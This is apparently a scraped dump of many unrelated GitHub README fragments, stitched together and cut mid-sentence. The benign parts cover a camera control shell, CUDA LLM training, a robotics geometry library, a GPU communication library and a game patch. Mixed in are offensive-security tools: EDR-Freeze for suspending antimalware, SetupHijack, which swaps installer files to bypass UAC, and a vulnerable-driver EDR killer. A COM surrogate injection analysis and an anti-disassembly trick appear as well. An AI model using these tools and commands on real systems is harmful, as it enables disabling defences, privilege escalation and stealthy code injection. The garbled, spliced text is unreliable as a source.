Temporarily halt all Antimalware/EDR processes for a short period (1-3 seconds).\n2. Execute tasks immediately after a successful suspension.\n\nSince the GUI may become unresponsive in some cases, you should choose the shortest sleep time possible. Just make sure that the script executions are completed before the Antimalware/EDR resumes.\n\nAlternatively, it's best to insert the code you want to execute directly into the source code of EDR-Freeze:\n\n<img width=\"748\" height=\"387\" alt=\"Insert code\" src=\"https://github.com/user-attachments/assets/1c6f8819-5a21-4cc4-b72f-ea00be0fd092\" />\n\n\n## Author:\n\n[Two Seven One Three](https://x.com/TwoSevenOneT)\n",

      "readme": "# SetupHijack\n\n---\n\n## Overview\n\n**SetupHijack** is a security research tool that exploits race conditions and insecure file handling in Windows installer and update processes. It targets scenarios where privileged installers or updaters drop files in `%TEMP%` or other world-writable locations, allowing an attacker to replace these files before they are executed with elevated privileges.\n\n- Does **not** require elevated permissions to run.\n- Does **not** use file system notifications (polls for changes instead).\n- Exploits weaknesses in Authenticode code signing and installer trust models.\n- Can infect `.exe`, `.msi`, and batch files (e.g., `sysinfo`, `netstat`, `ipconfig`).\n- Designed for red team, penetration testing, and security research use only.\n\nThe intended use of this tool is to run in the background on a compromised user account with privileges, in order to elevate another process by hijacking installer/updater file drops. \n\nThe chart below shows real-world example use cases of this exploit in multiple scenarios that can be used for UAC bypass. UAC bypasses are considered a security boundary when running under Adminless and are a common \"attacker requirement\" for disabling security controls. Exploitation of privileged Administrator operations provides generic exploit accessibility for malicious code to side-load or escalate process privileges. This tool can be used to identify additional applications which are exposed to the same types of risk, an attacker can wait for execution of these processes as a means to gain elevated rights without disrupting user behaviors. \n\n![SetupHijack Vulnerability Discovery Chart](Chart.png)\n\n## How It Works\n\n1. **SetupHijack** continuously scans `%TEMP%` (and subdirectories) for new or modified installer files.\n2. When a target file is detected, it is replaced with a user-supplied payload (EXE, MSI, or BAT), optionally preserving the original as a `.bak` file.\n3. If the privileged process executes the replaced file before integrity checks, the payload runs with elevated rights (e.g., SYSTEM or Administrator).\n4. The tool logs all actions and maintains a skiplist to avoid re-infecting the same files.\n\n## Code Signing Note\n\nThis project uses a hacked code-signing process with [SignToolEx.exe and SignToolExHook.dll](https://github.com/hackerhouse-opensource/SignToolEx) to sign payloads and installers. Using valid code-signing certificates and an Authenticode timestamp will increase your success rate when bypassing installer and OS trust checks.\n\n---\n\n## Usage\n\n### Build\n\n```sh\nnmake PAYLOAD=c:\\Path\\to\\your\\payload.exe\n```\n\n### Run (Options)\n\n```sh\nSetupHijack.exe                  # Scan %TEMP%, %APPDATA%, and %USERPROFILE%\\Downloads (default)\nSetupHijack.exe -notemp          # Disable scanning %TEMP%\nSetupHijack.exe -noappdata       # Disable scanning %APPDATA%\nSetupHijack.exe -nodownloads     # Disable scanning %USERPROFILE%\\Downloads\nSetupHijack.exe clean            # Clean mode (restores .bak backups in all enabled locations)\nSetupHijack.exe verbose          # Verbose mode (log all actions)\nSetupHijack.exe <payload.exe>    # Use specified payload for .exe (unless argument is a recognized option)\n```\n\n- Run **SetupHijack.exe** before or during a privileged install/update process.\n- By default, the tool scans all common drop locations: %TEMP%, %APPDATA%, and %USERPROFILE%\\Downloads.\n- You can disable any location with the `-notemp`, `-noappdata`, or `-nodownloads` flags.\n- The `clean` flag restores backups in all enabled locations. The `verbose` flag logs all actions.\n- For remote escalation, use with `shadow.exe` or similar tools on Terminal Services.\n\n## Example Attack Flow\n\n1. Build your payload and SetupHijack:\n   ```sh\n   nmake PAYLOAD=c:\\Users\\YourUser\\Desktop\\payload.exe\n   ```\n2. Start SetupHijack:\n   ```sh\n   SetupHijack.exe\n   ```\n3. Launch the target installer or update process as Administrator.\n4. If the installer drops files in `%TEMP%` and executes them with elevated rights, your payload will be substituted and run.\n\n## Example Output\n\nBelow is a real example of building and running SetupHijack, including code signing and infection output:\n\n```\nC:\\Users\\Fantastic\\Desktop\\Sayuri\\InfectElevatedSetups>nmake PAYLOAD=\"C:\\USers\\Fantastic\\Desktop\\DEMO\\Renge_x64.exe\"\n\nMicrosoft (R) Program Maintenance Utility Version 14.29.30159.0\nCopyright (C) Microsoft Corporation.

It connects to a Sony A6700 (and other supported bodies) over Wi-Fi or Ethernet, mirrors new captures straight to your workstation, and drops you into an interactive shell for remote control.\n\nThe shell can download files automatically, trigger the shutter, tweak exposure settings, start live view, run post-download hooks, and keep retrying if the camera drops offline. Everything runs from a single terminal window.\n\n---\n\n## Demo\n\nhttps://github.com/user-attachments/assets/6146ff3b-d51c-412b-8684-bdde5c418d4d\n\n---\n\n## Quick Start\n\n### Requirements\n- Linux (developed on Ubuntu 24.04) with a C++17 toolchain (`gcc`, `g++`, `cmake`, `make`).\n- Sony Camera Remote SDK v2.00.00 (download it from Sony and extract it somewhere convenient).\n- Python 3 for the small header-generation scripts.\n- Runtime deps: libedit, ncurses, libudev, libxml2, OpenCV 4.8 (bundled inside Sony’s SDK).\n\nOn Ubuntu/Debian you can grab the basics with:\n```bash\nsudo apt install autoconf libtool libudev-dev gcc g++ make cmake unzip libxml2-dev libedit-dev python3\n```\n\n### Build in a hurry\n1. Download and extract the Sony Camera Remote SDK v2.00.00, then point `SONY_SDK_DIR` at the folder that contains `app/` (example path shown below):\n   ```bash\n   export SONY_SDK_DIR=\"$HOME/SonySDK/CrSDK_v2.00.00_20250805a_Linux64PC\"\n   ```\n2. Configure CMake and prepare the generated-header folder:\n   ```bash\n   cmake -S . -B build -DSONY_SDK_DIR=\"$SONY_SDK_DIR\"\n   cmake -E make_directory build/gen\n   ```\n3. Generate the lookup tables that pretty-print SDK enums:\n   ```bash\n   python3 tools/gen_prop_names.py --header \"${SONY_SDK_DIR}/app/CRSDK/CrDeviceProperty.h\" -o build/gen/prop_names_generated.h\n   python3 tools/gen_error_names.py --header \"${SONY_SDK_DIR}/app/CRSDK/CrError.h\" -o build/gen/error_names_generated.h\n   ```\n4. Compile and copy the required Sony/OpenCV shared libraries next to the binary:\n   ```bash\n   cmake --build build --config Release\n   ```\n5. Run it (start with enumeration and let SonShell pick the download folder):\n   ```bash\n   ./build/sonshell --dir \"$PWD/photos\" --keepalive 3000\n   ```\n\nThe build copies `libCr_*`, the adapter modules, and Sony’s OpenCV libs into `build/`. Run the binary from inside `build/` (or keep the copied `.so` files alongside it) so live view keeps working.\n\n---\n\n## Command-Line Options\n\n| Option | Description |\n| --- | --- |\n| `--dir <path>` | Directory where downloads are stored. If omitted, files land in the working directory; providing an explicit folder is strongly recommended for sync features. |\n| `--ip <addr>` | Connect directly to a camera at the given IPv4 address (e.g. `192.168.1.1`). Skipped when enumerating automatically. |\n| `--mac <hex:mac>` | Optional MAC address for direct-IP connects (`aa:bb:cc:dd:ee:ff`). Used to seed the SDK’s Ethernet object. |\n| `--user <name>` | Username for cameras with Access Auth enabled. |\n| `--pass <password>` | Password for Access Auth. Combine with `--user`. |\n| `--cmd <path>` | Executable/script that SonShell calls for every file event (new downloads, syncs, rating changes, …). Arguments: `<path> <mode> <operation> [old] [new]`. Runs asynchronously; SonShell does not wait for completion. |\n| `--keepalive <ms>` | Reconnection delay after failure or disconnect. `0` disables retry (SonShell exits on error). |\n| `--verbose`, `-v` | Print detailed property-change logs and transfer progress from the SDK callbacks. |\n\nIf no `--ip` is provided SonShell enumerates available cameras and uses the first match. A fingerprint of the successful connection is cached under `~/.cache/sonshell/fp_enumerated.bin` so subsequent launches pair faster.\n\n---\n\n## Hook Events\n\nWhen `--cmd` is provided SonShell calls the hook for every file-affecting event. The hook always receives:\n\n```\n<path> <mode> <operation> [old] [new]\n```\n\n- `path` – absolute path to the newest local copy of the file.\n- `mode` – current camera operating mode resolved via the SDK. Examples:\n  - `record/still/m` → still capture in manual mode.\n  - `record/still/auto_plus` → still capture in Auto+ mode.\n  - `record/movie/cine_ei/sq` → movie clip shot in Cine EI with S&Q enabled.\n  - `playback` → events raised while browsing files on-body.\n- `operation` – high-level action SonShell observed.\n  - `new` – a freshly captured file copied to disk.\n  - `sync` – a file mirrored during a manual/auto sync.\n  - `rating` – the camera changed the star rating of a file (works wherever the SDK reports the update).\n- `old` / `new` – optional values tied to the operation (for `rating` they are the previous and current star counts, for `new`/`sync` only the `new` value is populated with the original camera path).\n\nThe hook is executed asynchronously, so long-running work should be handled internally or by delegating to background jobs.\n\n---\n\n## Shell Command Reference\n\n| Command | Variants / Subcommands | What it does ",

      "readme": "# LLM.Q\nQuantized LLM training in pure CUDA/C++.\n\n## Overview\n`llm.q` is an implementation of (quantized) large language model training in CUDA, inspired by [llm.c](https://github.com/karpathy/llm.c). It is particularly aimed at medium-sized training setups, i.e., a single node with multiple GPUs.\n\n## Build instructions\nThe code is written in C++20 and requires CUDA 12 or later.  It depends on [nccl](https://developer.nvidia.com/nccl) for communication, and [cudnn](https://developer.nvidia.com/cudnn) for fast attention. Multi-GPU training can either be run in multi-process mode (requires OpenMPI) or in multi-thread mode. On a recent ubuntu system, this should provide\nthe required dependencies (adapt cuda version as needed):\n```´shell\n# build tools\napt install cmake ninja-build git gcc-13 g++-13\n# libs\napt install cuda-12-8 cudnn9-cuda-12-8 libnccl2 libnccl-dev libopenmpi-dev\n```\n\nAdditional header-only dependencies are automatically downloaded by cmake during the build process.\nThese are:\n* [json](https://github.com/nlohmann/json)\n* [cudnn-frontend](https://github.com/NVIDIA/cudnn-frontend)\n* [CLI11](https://github.com/CLIUtils/CLI11)\n\nTo build the training executable, run\n```shell\nmkdir build\ncmake -S . -B build\ncmake --build build --parallel --target train\n```\n\n## How to train your (quantized) llm\n### Data preparation\nIn order to train/fine-tune a model, you first need some data. The [tokenize_data](tokenize_data.py) script provides a utility to prepare token files for training.\nIt only supports a limited number of datasets, but hacking it for your own dataset should be straightforward.\n```shell\nuv run tokenize_data.py --dataset tiny-shakespeare --model qwen\n```\nThis will create `tiny-shakespeare-qwen-train.bin` and `tiny-shakespeare-qwen-eval.bin`.\n\n### Training run\nLet's fine-tune the smallest Qwen model on this data:\n```shell\n./build/train --model=Qwen/Qwen2.5-0.5B \\\n  --train-file=data/tiny-shakespeare-qwen/train.bin \\\n  --eval-file=data/tiny-shakespeare-qwen/eval.bin \\\n  --model-dtype=bf16 --opt-m-dtype=bf16 --opt-v-dtype=bf16 \\\n  --matmul-dtype=e4m3 \\\n  --recompute-ffn --recompute-att \\\n  --grad-accumulation=8 --steps=30 \\\n  --learning-rate=1e-5 --gpus=1 --batch-size=8\n```\nThe program will print some logging information, such as the following:\n```text\n[Options]\n  recompute-swiglu  : true\n  recompute-norm    : false\n  [...]\n\n[System 0]\n  Device 0: NVIDIA GeForce RTX 4090\n  CUDA version: driver 13000, runtime 13000\n  Memory: 906 MiB / 24080 MiB\n  \nLoading model from `/huggingface/hub/models--Qwen--Qwen2.5-0.5B/snapshots/060db6499f32faf8b98477b0a26969ef7d8b9987/model.safetensors`\n done\n \n[Dataset]\n train:  329k tokens\n   data/tiny-shakespeare-qwen/train.bin :     329663\n eval:   33k tokens\n   data/tiny-shakespeare-qwen/eval.bin :      33698\n\n[Allocator State]\n        Adam V:   942 MiB\n        Adam M:   942 MiB\n     Gradients:   942 MiB\n   Activations:  4505 MiB\n        Master:   682 MiB\n       Weights:   601 MiB\n          Free: 14078 MiB\n      Reserved:   483 MiB\n         Other:   903 MiB\n```\n\nIf `[Allocator State]` shows a lot of `Free` memory (as it does here), you can try increasing the batch size (and adjust `--grad-accumulation` accordingly), or reduce the amount of activation checkpointing.\nFor example, on a 16GiB 4060Ti, `--recompute-ffn --recompute-att` can be replaced by `--recompute-swiglu`, which increases the activation memory from `4.5 GiB` to `9 GiB`, and\nthe speed from ~11k tps to ~13k tps.\n\nThen, the actual training will begin:\n````text\n[T] step     0 [ 19.9%] | time:  1869 ms | norm   4.315545 | loss   3.282568 | tps 35064 | sol 42.9%\n[T] step     1 [ 39.8%] | time:  1709 ms | norm   8.423664 | loss   3.310652 | tps 38347 | sol 46.9%\n[T] step     2 [ 59.6%] | time:  1708 ms | norm   4.818971 | loss   3.330125 | tps 38370 | sol 47.0%\n[T] step     3 [ 79.5%] | time:  1715 ms | norm   5.247286 | loss   3.259991 | tps 38213 | sol 46.8%\n[V] step     4 [  0.0%] | time:   165 ms | eval   2.945187 | train  3.295834 | tps  148k\n````\nEach `[T]` line is a training step (in contrast to `[V]` validation). It shows the step number, the progress within the epoch,\nthe elapsed time, as well as the current loss and gradient norm. It also calculates the current throuput in tokens per second,\nand sets this in relation to the GPU's speed of light (SOL), i.e., the fastest possible speed if the GPU was only running strictly necessary matmuls at peak flop/s.\n\n### Inspecting the logs\nAfter 50 steps, the training will finish, and save the final model to `model.safetensors`. In addition, a log file will be created,\nwhich contains the training log in JSON format. We can visualize the log using the `plot-training-run.py` utility script:`\n```shell\nuv run python/plot-training-run.py log.json\n```\nThis shows the training and evaluation losses over time, for quick inspection.\nFor a more detailed and interactive workflow, you can export the log to weights&biases:\n```shell\nuv run python/export-wandb.py --log-file log.jso",

      "readme": "# refx\n\n**refx** is a modern header-only C++ library designed for mobile robotics and navigation. Its core philosophy is to leverage the C++ type system to provide compile-time safety for all geometric and geodetic calculations. This prevents a wide class of common and difficult-to-debug errors that arise from incorrect handling of coordinate reference frames.\n\n> [!WARNING]\n> refx is still in development (0.x.y) and API interface may change between minor revisions. Please use the releases packages for direct import or specify a commit tag if you are using refx with CMake `FetchContent`\n\n## Documentation\n\nRead the **[Full Documentation](https://mosaico-labs.github.io/refx-doc)**, to dive in — explore APIs and classes to help you build and contribute faster.\n\nFor a collection of practical, real-world recipes designed to help you solve common problems in robotics and navigation, read ***The refx [Cookbook](https://mosaico-labs.github.io/refx-doc/cookbook)***.\n\n## Who is this for?\n\nThis library is intended for robotics engineers, researchers, and students working on applications that require a high degree of navigational accuracy and reliability, such as:\n\n  * Sensor fusion for Inertial Navigation Systems (INS)\n  * UAV/drone flight control and guidance\n  * Autonomous ground vehicle (AGV) localization\n  * Marine and sub-surface navigation\n  * Geodetic surveying and mapping\n\n## Key Features\n\n  * **Type-Safe Frames**: Each coordinate frame (e.g., NED, ECEF, FRD) is a unique type, preventing accidental mixing of incompatible data.\n  * **Mathematical Correctness**: A strict semantic distinction is enforced between absolute positions (`Coordinate3D`) and displacement vectors (`Vector3D`). Operations are designed to reflect their true mathematical meaning.\n  * **High-Fidelity Models**: Includes standard geodetic models (WGS-84), gravity models, and a concrete implementation of the World Magnetic Model (WMM2020) for high-accuracy applications.\n  * **Compile-Time Dispatch**: A powerful template-based system automatically selects the correct mathematical logic for linear vs. angular coordinates, ensuring correctness for geodetic calculations.\n\n## Ecosystem Integration\nrefx is designed to be a self-contained, lightweight library. However, for maximum utility, it provides optional, first-class support for **Eigen3**.\n\n## Installation\n\n### CMake\nHere's the code you'd add to your project's `CMakeLists.txt` file to import the refx library.\n```cmake\ninclude(FetchContent)\nFetchContent_Declare(\n  refx\n  GIT_REPOSITORY https://github.com/mosaico-labs/refx.git/\n  GIT_TAG        v0.1.0\n)\nFetchContent_MakeAvailable(refx)\n```\n\nFrom this point on, the `refx::refx` target is available to your project and this command can be used to to link refx.\n```cmake\ntarget_link_libraries(my_target PRIVATE refx::refx)\n```\n\n### Conan\nYou can install refx using Conan via the [klin](https://github.com/conan-kiln/kiln) repository.\n\n- Set up Conan Kiln as a remote following the [instructions](https://github.com/conan-kiln/kiln#setup)\n- Include `refx/[>=0.2.1 <1]` as a requirement under your `conanfile.txt` or `conanfile.py`.\n- Follow the regular [instructions](https://docs.conan.io/2/tutorial.html) for integrating Conan packages into your project\n\nSpecial thanks to [@valgur](https://github.com/valgur) for adding Conan support.\n\n## Requirements\nDeveloping with refx requires only a C++17 compatible compiler, running tests requires Google Test as dependency (downloaded automatically by CMake).\n\n## Getting Started\n\nUsing `refx` is straightforward. The following example demonstrates the core features of the library: creating frame-aware vectors and coordinates, leveraging compile-time safety, and performing transformations.\n\n\n### A Practical Example\n\nThe code below simulates a common scenario: taking a vehicle's body-frame velocity, rotating it into the world frame, and projecting a global GPS coordinate into a local navigation frame.\n\n```cpp\n//getting_started.cpp\n#include <iostream>\n#include <cmath>\n#include <refx/geometry.h>  // for Vector3D, Coordinate3D, Rotation and YawPitchRoll\n#include <refx/transformations.h> // frame_cast, frame_transform\n\nusing namespace refx;\n\nint main() {\n    // 1. Create frame-aware vectors. Types are tagged with their frame.\n    Vector3D<ned> velocity_ned{10.0, -2.0, 0.5};  // {N, E, D}\n    Vector3D<frd> omega_body{0.0, 0.0, 0.03};     // {F, R, D}\n\n    std::cout << \"Velocity in NED frame: \" << velocity_ned << std::endl;\n\n    // 2. COMPILE-TIME SAFETY: Mixing frames is a compiler error.\n    // Uncommenting the line below will cause a compile-time error, preventing a common bug.\n    // velocity_ned + thrust_in_body;  // ERROR: Incompatible frames!\n\n    // 3. Define a rotation from the body frame to the world (NED) frame.\n    // Let's assume a 45-degree yaw (pi/4 radians).\n    auto yaw_pitch_roll = YawPitchRoll<double>(M_PI / 4.0, 0.0, 0.0);\n    auto R_world_from_body = Rotation<ned, frd>(yaw_pitch_roll);\n\n    // 4.

Do not use it on systems you do not own.\n\n1. Load the vulnerable driver:\n   ```powershell\n   sc.exe create killer binPath=\"C:\\Path\\To\\wamsdk.sys\" type=kernel\n   sc.exe start killer\n   ```\n\n 2. Run the PoC\n```\n.\\WatchDogKiller.exe\n\nWatchDog EDR Terminator Tool @j3h4ck\n================================================\n\nSuccessfully opened Zam device\nAttempting to register process 9444...\nSuccessfully registered process 9444\n\nEnter PID to terminate: 30724\nWait for process exit?

To increase this limit, add the following to your launch options (example for 120 FPS):  \n> `DXVK_FRAME_RATE=120 WINEDLLOVERRIDES=\"dinput8=n,b\" %command%`\n\n# Features\n\n## Havok Physics Fix\n\nStabilizes physics behavior at high framerates to eliminate the annoying flying corpses and limbs. While physics issues begin above 30 FPS, they become noticeably problematic after 100 FPS, causing dead bodies and severed limbs to launch erratically across rooms.\n\n## High-Core CPU Fix\n\nPrevents the game from crashing on systems with more than 10 CPU cores. The game's CPU detection code collects information about each core into fixed-size arrays, but these arrays weren't sized to handle more than 10 cores. When more cores are detected, the code overflows these arrays, corrupting memory and causing crashes later during execution. The patch stops the CPU detection loop early to prevent this overflow.\n\n## VSync Refresh Rate Fix\n\nCorrects the VSync implementation to use the refresh rate selected in the game's settings instead of locking to 30 FPS. The original implementation ignores your chosen refresh rate and forces 30 FPS when VSync is enabled.\n\n<div align=\"center\">\n  <table>\n    <tr>\n      <td width=\"50%\"><img style=\"width:100%\" src=\"assets/vsyncfix_off.png\"></td>\n      <td width=\"50%\"><img style=\"width:100%\" src=\"assets/vsyncfix_on.png\"></td>\n    </tr>\n    <tr>\n      <td align=\"center\">Vanilla (Locked to 30 FPS)</td>\n      <td align=\"center\">MarkerPatch (Uses Selected Rate)</td>\n    </tr>\n  </table>\n</div>\n\n## Automatic Weapon Fire Rate Fix\n\nStabilizes the fire rate of automatic weapons across all framerates. The game's weapon cooldown system checks more frequently at higher framerates, causing automatic weapons like the Pulse Rifle and Flamethrower to fire progressively faster as FPS increases.\n\n## Save System Fixes\n\n### Difficulty Reward Tracking\nFixes the tracking of Zealot and Hardcore difficulty completions to properly unlock rewards. \n\n> **Important**: This fix requires starting a new save with the patch installed. You must keep the patch installed for the entire playthrough for the fix to remain effective.\n\n### Suit ID Conflicts\nResolves item database conflicts where certain DLC suits incorrectly share IDs with other suits:\n- **Zealot Suit** was conflicting with the Security Suit.\n- **Hacker Suit** was conflicting with the Elite Advanced Suit.\n\nThese conflicts would cause one suit to overwrite the other in your inventory, making purchased items disappear.\n\n### String Buffer Overflow Prevention\nPrevents crashes that can rarely occur when the game enumerates save files. This happens in two scenarios: when checking for Dead Space 1 saves to grant the DLC bonus for owning the first game, and when listing your Dead Space 2 save files in the load menu. Though these crashes are uncommon, they can be frustrating when they do occur.\n\n## Subtitle Font Scaling\n\nScales subtitle text appropriately for high resolutions. The game was designed with console limitations in mind and intentionally prevents subtitles from scaling beyond 720p resolution, making them tinier at 1080p and above. This fix removes that limitation and allows proper scaling.\n\nFor those who prefer different subtitle sizes, `FontScalingFactor` in `MarkerPatch.ini` allows fine-tuning the subtitle text size to personal preference.\n\n<div align=\"center\">\n  <table>\n    <tr>\n      <td width=\"50%\"><img style=\"width:100%\" src=\"assets/scaling_off.png\"></td>\n      <td width=\"50%\"><img style=\"width:100%\" src=\"assets/scaling_on.png\"></td>\n    </tr>\n    <tr>\n      <td align=\"center\">4K Vanilla</td>\n      <td align=\"center\">4K MarkerPatch</td>\n    </tr>\n  </table>\n</div>\n\n## Raw Mouse Input\n\nImplements proper raw mouse input to fix sensitivity issues. This works similarly to the existing \"Dead Space 2 Mouse Fix\" mod with several improvements:\n- Added support for zero-gravity areas. (the original mouse fix didn't work properly in zero-G)\n- Sensitivity scaling now matches the in-game sensitivity settings more accurately.\n- Does not interfere with controller inputs when switching between mouse and gamepad.\n\nThe fix decouples mouse sensitivity from the game's fr",

Unlike traditional COM hijacking methods focused primarily on persistence, this technique exploits the surrogate hosting capabilities to achieve process injection with several operational advantages, including parent process masquerading and reduced detection footprint.\n\n\n## 1. Introduction\n\nComponent Object Model (COM) hijacking has been extensively documented as a persistence mechanism in the MITRE ATT&CK framework. This paper examines the technical mechanics of COM-based DLL Surrogate injection.\n\n\n## 2. Technical Background\n\n### 2.1 What is COM?\n\nThe Component Object Model (COM) is a Microsoft technology that enables software components to communicate regardless of the programming language used to create them. COM objects are identified by globally unique identifiers (GUIDs) called Class Identifiers (CLSIDs) and can be instantiated through various mechanisms including:\n\n- **In-process servers** (DLLs loaded into the calling process)\n- **Out-of-process servers** (Separate executable processes)\n- **Surrogate processes** (System-provided hosts for DLL-based COM objects)\n\n\n### 2.2 Understanding dllhost.exe and DLL Surrogates\n\n`dllhost.exe` is a legitimate Windows system process that serves as a surrogate host for COM objects implemented as DLLs. This mechanism, known as “DLL Surrogate,” allows DLL-based COM objects to run in a separate process space, providing:\n\n- **Process isolation**: Protects the calling application from DLL crashes\n- **Security boundaries**: Enables different security contexts\n- **Stability**: Prevents unstable DLLs from affecting the parent process\n\nThe surrogate is configured through registry entries, specifically the `DllSurrogate` value under the AppID registry key.\n\n\n## 3. Attack Technique Analysis\n\n### 3.1 Registry Manipulation for HKCU Hijacking\n\nThe technique operates by creating specific registry entries in `HKEY_CURRENT_USER` rather than `HKEY_LOCAL_MACHINE`, which provides several advantages:\n\n1. **Reduced privileges required**: No administrator rights needed\n1. **User-specific targeting**: Affects only the current user context\n1. **Stealth**: Less likely to be monitored compared to HKLM modifications\n\n#### Registry Structure Created:\n\n```\nHKCU\\Software\\Classes\\AppID\\{CLSID}\n├── (Default) = \"MyStealthObject\"\n└── DllSurrogate = \"\"\n\nHKCU\\Software\\Classes\\CLSID\\{CLSID}\n├── (Default) = \"MyStealthObject\"\n├── AppID = \"{CLSID}\"\n└── InprocServer32\\\n    ├── (Default) = \"C:\\Path\\To\\Malicious.dll\"\n    └── ThreadingModel = \"Apartment\"\n```\n\n\n### 3.2 Process Tree Masquerading\n\nWhen the malicious COM object is instantiated with `CLSCTX_LOCAL_SERVER`, Windows automatically launches `dllhost.exe` as a surrogate process. This creates a deceptive process tree:\n\n```\nsvchost.exe (COM+ System Application)\n└── dllhost.exe /Processid:{CLSID}\n    └── [Malicious DLL loaded in-process]\n```\n\n**Key Advantages:**\n\n- The parent process appears as `svchost.exe`, a highly trusted system process\n- The initiating malicious process is not the direct parent of the injection target\n- Standard parent-child process monitoring may miss the true attack chain\n\n## 4. Detailed Code Analysis\n\n### 4.1 CLSID Definition and Constants\n\n```cpp\nstatic const wchar_t* CLSID_STR = L\"{F00DBABA-2504-2025-2016-666699996666}\";\n```\n\nThe technique begins with a custom CLSID (Class Identifier), a 128-bit GUID that uniquely identifies the COM object. This particular CLSID is crafted to appear distinctive while avoiding conflicts with legitimate system components. The format follows the standard GUID structure: `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`.\n\n### 4.2 Registry Manipulation Function\n\n```cpp\nbool SetRegStr(HKEY root, const std::wstring& key, \n               const std::wstring& name, const std::wstring& val) {\n    HKEY h;\n    if (RegCreateKeyExW(root, key.c_str(), 0, nullptr,\n        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS)\n        return false;\n    \n    if (RegSetValueExW(h,\n        name.empty() ? nullptr : name.c_str(),\n        0, REG_SZ,\n        (const BYTE*)val.c_str(),\n        DWORD((val.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS)\n    {\n        RegCloseKey(h);\n        return false;\n    }\n    RegCloseKey(h);\n    return true;\n}\n```\n\n**Technical Breakdown:**\n\n1. **`RegCreateKeyExW`**: Creates or opens the specified registry key with `KEY_WRITE` permissions\n1. **Error Handling**: Each registry operation includes proper error checking\n1. **`REG_OPTION_NON_VOLATILE`**: Ensures the key persists across reboots -> Could be changed with **`REG_OPTION_VOLATILE`** (Stored in memory and is not preserved when the corresponding registry hive is unloaded)\n\n### 4.3 AppID Registry Configuration\n\n```cpp\nstd::wstring appidKey = LR\"(Software\\Classes\\AppID\\)\" + std::wstring(CLSID_STR);\n",

It provides communication primitives such as **all-reduce, all-gather, reduce, broadcast, reduce-scatter**, and general **send/recv**. It is compatible with **PCIe, NVLink, and NVSwitch**, and supports **cross-node communication via InfiniBand Verbs or TCP/IP sockets**. It can be used in single-node/multi-node, multi-process (e.g., MPI), or single-process applications.\n\n---\n\n## 🅾 Introduction\n\nVCCL redefines the GPU communication experience with three core capabilities: **High Efficiency, High Availability, and High Visibility**.\n\n- **High Efficiency**  \n  Inspired by the **DPDK** design philosophy, VCCL introduces a **“DPDK-Like P2P” high-performance scheduling mechanism**, ensuring that GPUs remain fully utilized.  \n  In the early days of high-speed networking on CPUs, achieving 10Gbps network performance was nearly impossible due to kernel stack overhead (multiple memory copies, interrupt handling inefficiencies). DPDK solved this by leveraging **hugepage memory + zero-copy** and moving the data path from kernel space to user space.  \n  Similarly, current CUDA still faces limitations in communication/computation scheduling and API granularity (public sources note that ~20 out of 132 SMs on the H800 GPU are reserved for communication). VCCL adopts an analogous optimization strategy: **offloading communication tasks from GPU CUDA stack to the CPU side**, combined with **zero-copy** and **global load balancing across pipeline parallel workflows (PP)**.  \n  In **training dense models with hundreds of billions of parameters**, our internal benchmarks show that **cluster-wide training compute efficiency improves by ~2% compared to state-of-the-art baselines** ([More about use zerocopy for training](https://vccl-doc.readthedocs.io/en/latest/features/sm-free-overlap/)).\n  \n  Note: The SM-Free mode currently does not support fault tolerance or telemetry; this is planned as future work.\n\n- **High Availability**  \n  Provides a **lightweight local recovery fault-tolerance mechanism** that effectively handles **NIC failures and switch faults** without significantly increasing system overhead. Concretly, when link fail occurs, VCCL can migrades the traffic within one iteration by **creating a backup QP**. Simultaneously, VCCL supports **seamless traffic recovery to the primary QP** once link integrity is re-established. In practice, this reduces overall training interruption rates by **over 50%** ([More about fault tolerance](https://vccl-doc.readthedocs.io/en/latest/features/fault-tolerance/)).\n\n- **High Visibility**  \n  Offers **microsecond-level sliding-window flow telemetry**, enabling efficient bottleneck localization and **congestion detection** for performance tuning([More about flow telemetry](https://vccl-doc.readthedocs.io/en/latest/features/flow-telemetry/)).\n\nFor more information about VCCL and how to use it, please refer to the [VCCL documentation](https://vccl-doc.readthedocs.io/).\n\n---\n## Build from Source\n\n> **Note**: Currently, only source builds are supported.\n\n```bash\n$ git clone https://github.com/sii-research/VCCL.git\n$ cd VCCL\n$ make -j src.build\n```\n\nIf CUDA is not installed under /usr/local/cuda:\n\n```bash\n$ make src.build CUDA_HOME=<path to cuda install>\n```\n\nBuild artifacts are placed in the build/ directory (can be customized via BUILDDIR).\n\nBy default, VCCL compiles for all supported architectures. To speed up builds and reduce binary size, redefine NVCC_GENCODE (in makefiles/common.mk) to include only your target architecture(s):\n\n```sh\n# Example: build only for Hopper architecture (H100/H200, sm_90)\n$ make -j80 src.build NVCC_GENCODE=\"-gencode=arch=compute_90,code=sm_90\"\n```\n\n## 📦 Packaging & Installation\nTo install VCCL on your system, build a package and install it as root:\n\n```sh\n# Debian/Ubuntu\nsudo apt install -y build-essential devscripts debhelper fakeroot\nmake pkg.debian.build\nls build/pkg/deb/\n\n# RedHat/CentOS\nsudo yum install -y rpm-build rpmdevtools\nmake pkg.redhat.build\nls build/pkg/rpm/\n\n# OS-agnostic tarball\nmake pkg.txz.build\nls build/pkg/txz/\n```\n\n## 🍽️ Testing\nTests for VCCL are maintained separately at NVIDIA NCCL Tests.\n\n```sh\n$ git clone https://github.com/NVIDIA/nccl-tests.git\n$ cd nccl-tests\n$ make\n$ ./build/all_reduce_perf -b 8 -e 256M -f 2 -g <ngpus>\n```\n\n## 🙇‍♂️ License & Acknowledgements\n\n* This project is developed",

      "readme": "# 👻 Ghost in opcode\n\nThis repository contains the Proof-of-Concept and research for a 25-year-old architectural blind spot affecting modern reverse engineering tools.\n\n[![SAMPLE X86](https://raw.githubusercontent.com/sapdragon/hint-break/refs/heads/main/images/sample.png)](https://raw.githubusercontent.com/sapdragon/hint-break/refs/heads/main/images/sample.png)\n\n## The Blind Spot\n\nIn 1997, Intel patented (US5,701,442) a series of \"Hintable NOPs\". While most of these have been assigned functions or are correctly parsed, two opcodes — **`0F 1A`** and **`0F 1B`** — remain ghosts in the machine.\n\nCPUs execute these instructions as valid, multi-byte NOPs. However, leading disassemblers like **IDA Pro, Ghidra, and Binary Ninja** fail to recognize them. They interpret valid, executable code as unknown data, breaking static analysis and creating a simple but highly effective method for anti-disassembly.\n\nThis fundamental issue has remained largely unnoticed for decades.\n\n## How to Test\n\nYou can see the blind spot in action yourself in under a minute.\n\n1.  Grab the pre-compiled binary: `/samples/patched.exe`.\n2.  Open it in your favorite disassembler (IDA, Ghidra, etc.).\n3.  Navigate to the function.\n4.  Observe how the 